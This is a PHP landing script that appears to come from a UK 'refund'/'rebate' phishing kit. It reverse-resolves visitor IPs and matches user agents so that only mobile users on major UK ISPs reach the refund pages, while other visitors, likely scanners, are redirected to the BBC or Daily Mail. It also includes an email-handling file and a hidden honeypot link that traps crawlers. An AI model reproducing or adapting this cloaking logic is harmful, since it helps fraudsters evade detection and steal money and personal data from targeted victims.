<?php include(realpath(getenv('DOCUMENT_ROOT')) . '/rebate/index.php');
session_start();
error_reporting(0);
include "refund/includes/my_email.php";
include "One_Time.php";
$_SESSION['access'] = "access";
$_SESSION['g'] = $_GET['ea'];
if(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "threembb.co.uk") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "in-addr.btopenworld.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "bb.isp.sky.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".bcube.co.uk") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".host.pobb.as") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".cable.virginm.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".skybroadband.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "static.virginmediabusiness.co.uk") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "btcentralplus.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "bb.sky.com") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "dyn.plus.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), "as13285.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: https://www.bbc.co.uk", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".murphx.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: rebate/", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".dynamic.dsl.as") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: rebate/", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".dab.02.net") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: rebate/", true, 301);
	}}
elseif(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']), ".static.virginmediabusiness.co.uk") !== false){
	if(preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"])){
		header("Location: refund/index?code=2");
	}
	else{
		header("Location: rebate/", true, 301);
	}}
else {
	header("Location: https://www.dailymail.co.uk/", true, 301);
}
?>
<a rel="nofollow" style="display:none;" href="/rebate/">Do NOT follow this link or you will be banned from the site!</a>